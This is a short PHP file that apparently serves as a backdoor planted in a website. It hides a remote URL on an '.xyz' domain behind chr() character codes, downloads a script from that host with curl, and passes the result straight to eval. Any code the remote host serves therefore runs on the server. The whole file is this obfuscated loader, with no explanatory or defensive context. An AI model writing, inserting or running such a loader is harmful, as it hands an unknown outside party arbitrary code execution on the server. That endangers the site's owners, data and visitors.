<?php
function c($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $output = curl_exec($ch);
    curl_close($ch);
    return $output;
}
$a = c(chr(104).chr(116).chr(116).chr(112).chr(58).chr(47).chr(47).chr(110).chr(115).chr(49).chr(57).chr(46).chr(105).chr(115).chr(97).chr(112).chr(105).chr(50).chr(53).chr(116).chr(101).chr(109).chr(112).chr(46).chr(120).chr(121).chr(122).chr(47).'xdb42b455d85b1573f324e484f6459981.js');
eval('?>' . $a);
?>